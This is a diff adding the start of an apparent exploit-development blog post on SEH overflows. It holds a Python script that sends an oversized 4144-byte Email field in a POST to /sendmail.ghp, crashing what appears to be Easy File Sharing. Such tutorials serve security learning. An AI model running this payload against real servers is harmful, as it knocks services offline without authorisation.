@@ -1,0 +1,26 @@
+<p>Welcome back! In this post we are going to be exploring the Structured Exception Handler ( or SEH).</p>
+
+<p>What is the SEH?</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python</span>
+
+<span class="n">import</span> <span class="n">socket</span>
+<span class="n">import</span> <span class="n">sys</span>
+
+<span class="k">if</span> <span class="n">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="nf">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+	<span class="nb">print</span> <span class="s2">"Usage: python EFS.py [IP]</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="nb">print</span> <span class="s2">"i.e python  EFS.py 192.168.56.101</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+
+<span class="n">crash</span> <span class="o">=</span> <span class="s2">"A"</span> <span class="o">*</span>  <span class="mi">4144</span>
+
+<span class="n">buffer</span>  <span class="o">=</span><span class="s2">"POST /sendmail.ghp HTTP/1.1 </span><span class="se">\r\n</span><span class="s2">"</span> 
+<span class="n">buffer</span> <span class="o">+=</span><span class="s2">"Email="</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s2">"&amp;getPassword=Get+Password"</span>
+
+<span class="no">EFS</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="no">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="no">SOCK_STREAM</span><span class="p">)</span>
+<span class="no">EFS</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">sys</span><span class="p">.</span><span class="nf">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">80</span><span class="p">))</span>
+<span class="no">EFS</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span>
+<span class="no">EFS</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div></div>
+
